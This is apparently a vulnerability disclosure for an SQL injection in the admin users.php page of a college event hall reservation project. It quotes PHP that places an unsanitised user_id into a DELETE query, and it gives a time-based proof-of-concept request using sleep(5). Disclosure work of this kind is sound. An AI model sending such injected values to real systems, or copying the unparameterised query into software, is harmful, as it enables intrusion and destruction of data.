# MAGESH-K21 / Online-College-Event-Hall-Reservation-System - SQL Injection users.php

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>

## Vendor Homepage:
> https://github.com/MAGESH-K21/Online-College-Event-Hall-Reservation-System/
> 
## Affected Component
> /admin/users.php

## Code
```php
if(isset($_GET['user_id'])){
    $uid = $_GET['user_id'];
    $sql = "DELETE FROM tbl_user WHERE user_id = $uid";
    $result = $conn->query($sql);
}
```

## Proof of Concept
**HTTP Request Example**
``` http request
GET /admin/users.php?user_id=sleep(5) HTTP/1.1
Host: [REDACTED]
```

## Screenshot


